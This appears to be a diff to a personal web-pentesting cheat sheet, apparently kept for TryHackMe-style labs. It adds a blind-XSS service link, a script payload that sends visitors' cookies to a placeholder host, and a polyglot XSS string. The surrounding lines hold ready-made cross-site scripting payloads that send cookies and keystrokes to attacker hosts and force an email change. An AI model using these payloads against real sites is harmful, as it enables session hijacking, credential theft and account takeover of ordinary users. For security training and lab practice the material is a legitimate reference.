@@ -17,6 +17,7 @@ https://transparencyreport.google.com/https/certificates                        
 google: "-site:www.domain.com site:*.domain.com"                                  # Google dorks
 
 https://requestbin.com/                                                           # For request 
+https://xsshunter.com/                                                            # For blind XSS
 
 
 ######################## Enumerate host ##############################################
@@ -46,6 +47,11 @@ curl http://site.com/images/favico.ico | md5sum                                 
 <script>fetch('https://hacker.serv/st?cookie=' + btoa(document.cookie));</script>  # Steal cookie
 <script>document.onkeypress = function(e) {fetch('https://hacker.srv/log?key='+btoa(e.key));}</script> # Key loggin steal
 <script>user.changeEmail('hacker@mail');</script>                                  # Use document script for xss
+<script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>     # Send users cookie to your URL
+
+
+#### Polyglot XXS ####
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
 
 ########################### Path traversal #########################################
 
